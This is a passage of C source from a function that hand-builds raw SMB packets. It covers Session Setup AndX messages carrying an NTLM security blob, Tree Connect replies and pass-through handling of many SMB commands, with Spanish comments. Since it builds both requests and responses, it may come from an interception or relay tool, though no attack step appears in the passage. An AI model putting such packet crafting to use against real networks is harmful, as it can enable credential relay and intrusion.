				memcpy(NewSmbPacket->buffer +sizeof(SessionSetupAndXResponse) +1 + sizeof(tail1) ,(char*)tail2,sizeof(tail2));
				//memcpy(NewSmbPacket->buffer,"\x00\x00\x00",3);	
                free(SessionSetupAndXResponseMessage);
			} else {
				SessionSetupAndXMessage=(SessionSetupAndX *)malloc(sizeof(SessionSetupAndX));
				memset((char*)SessionSetupAndXMessage,'\0',sizeof(SessionSetupAndX));
				NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(SessionSetupAndX) + DataSize + 1 + sizeof(tail1) + sizeof(tail2) +2 -4 );
				//printf("packet len: %x\n",SREV(NewSmbPacket->SmbMessageLength));
                //printf("LEN: %x\n",NewSmbPacket->SmbMessageLength);
				SessionSetupAndXMessage->WordCount=12;
				SessionSetupAndXMessage->AndXCommand=0xff;
				SessionSetupAndXMessage->AndXOffset= SREV (NewSmbPacket->SmbMessageLength);//sizeof(smheader)-1024 +NtlmPacketLen + 1+ sizeof(tail1) + sizeof(tail2) +2 -4;

				SessionSetupAndXMessage->MaxBuffer=4356;//16644;
				SessionSetupAndXMessage->MaxMpxCount=10;
				SessionSetupAndXMessage->SecurityBloblength=DataSize; //Longitud del paquete NTLM
				SessionSetupAndXMessage->capabilities=0x800000d4; //0x200000D4;
				SessionSetupAndXMessage->ByteCount=(uint16) DataSize + 1 + sizeof(tail1) +sizeof(tail2) +2 ; //incluimos 2 nulls al final  y un byte antes de los wchars

				memcpy(NewSmbPacket->buffer,(char*)SessionSetupAndXMessage,sizeof(SessionSetupAndX));
				memcpy(NewSmbPacket->buffer+sizeof(SessionSetupAndX),(char*)data,DataSize);
				memcpy(NewSmbPacket->buffer +sizeof(SessionSetupAndX) + DataSize +1,(char*)tail1,sizeof(tail1));
				memcpy(NewSmbPacket->buffer +sizeof(SessionSetupAndX) + DataSize +1 + sizeof(tail1) ,(char*)tail2,sizeof(tail2));
                free(SessionSetupAndXMessage);
			}
            //free(SessionSetupAndXResponseMessage);
		}
		break;


	case TREECONNETANDX:
        if (SubCommand== STATUS_BAD_NETWORK_NAME ){
            NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) + sizeof(TreeConnectAndXResponse) -4 );
            NewSmbPacket->NtStatus=STATUS_BAD_NETWORK_NAME;
            memset(NewSmbPacket->buffer,'\0',3);
        } else {
            NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) + DataSize -4); 
            memcpy(NewSmbPacket->buffer,data,DataSize);
        }
        break;



    case SMB_COM_CREATE_DIRECTORY:
    case SMB_COM_DELETE_DIRECTORY:
    case SMB_COM_OPEN:
    case SMB_COM_CREATE:
//    case SMB_COM_CLOSE:
    case SMB_COM_FLUSH:
    case SMB_COM_DELETE:
    case SMB_COM_RENAME:
    case SMB_COM_QUERY_INFORMATION:
    case SMB_COM_SET_INFORMATION:
    case SMB_COM_READ:
    case SMB_COM_WRITE:
    case SMB_COM_LOCK_BYTE_RANGE:
    case SMB_COM_UNLOCK_BYTE_RANGE:
    case SMB_COM_CREATE_TEMPORARY:
    case SMB_COM_CREATE_NEW:
    case SMB_COM_CHECK_DIRECTORY:
    case SMB_COM_PROCESS_EXIT:
    case SMB_COM_SEEK:
    case SMB_COM_LOCK_AND_READ:
    case SMB_COM_WRITE_AND_UNLOCK:
    case SMB_COM_READ_RAW:
    case SMB_COM_READ_MPX:
    case SMB_COM_READ_MPX_SECONDARY:
    case SMB_COM_WRITE_RAW:
    case SMB_COM_WRITE_MPX:
    case SMB_COM_WRITE_COMPLETE:
    case SMB_COM_SET_INFORMATION2:
    case SMB_COM_QUERY_INFORMATION2:
    case SMB_COM_LOCKING_ANDX:
//    case SMB_COM_TRANSACTION:
    case SMB_COM_TRANSACTION_SECONDARY:
    case SMB_COM_IOCTL:
    case SMB_COM_IOCTL_SECONDARY:
    case SMB_COM_COPY:
    case SMB_COM_MOVE:
    case SMB_COM_ECHO:
    case SMB_COM_WRITE_AND_CLOSE:
    case SMB_COM_OPEN_ANDX:
//    case SMB_COM_READ_ANDX:
//    case SMB_COM_WRITE_ANDX:
    case SMB_COM_CLOSE_AND_TREE_DISC:
//    case SMB_COM_TRANSACTION2:
    case SMB_COM_TRANSACTION2_SECONDARY:
    case SMB_COM_FIND_CLOSE2:
    case SMB_COM_FIND_NOTIFY_CLOSE:
    case SMB_COM_TREE_CONNECT:
    case SMB_COM_TREE_DISCONNECT:
   // case SMB_COM_NEGOTIATE:
   // case SMB_COM_SESSION_SETUP_ANDX:
    case SMB_COM_LOGOFF_ANDX:
//    case SMB_COM_TREE_CONNECT_ANDX:
    case SMB_COM_QUERY_INFORMATION_DISK:
    case SMB_COM_SEARCH:
    case SMB_COM_FIND:
    case SMB_COM_FIND_UNIQUE:
    case SMB_COM_NT_TRANSACT:
    case SMB_COM_NT_TRANSACT_SECONDARY:
//    case SMB_COM_NT_CREATE_ANDX:
    case SMB_COM_NT_CANCEL:
    case SMB_COM_OPEN_PRINT_FILE:
    case SMB_COM_WRITE_PRINT_FILE:
    case SMB_COM_CLOSE_PRINT_FILE:
    case SMB_COM_GET_PRINT_QUEUE:
    case SMB_COM_READ_BULK:
    case SMB_COM_WRITE_BULK:
    case SMB_COM_WRITE_BULK_DATA:
	
         NewSmbPacket->SmbMessageLength=(uint16) SREV (sizeof(smheader)- sizeof(NewSmbPacket->buffer) + DataSize -4 );
         NewSmbPacket->flags2=0x4803; //No Unicode
         NewSmbPacket->TreeId=((smheader *)PreviousSmbMessage)->TreeId;
         memcpy((char*)NewSmbPacket->buffer,data,DataSize);
		//printf("Unsupported SMB message\n");
		//exit(1);
         break;
     default:
         //printf("Unsupported SMB message\n");
         free(NewSmbPacket);
         return(NULL);
         break;
	}
	return(NewSmbPacket);
}
/**************************************************************************************/



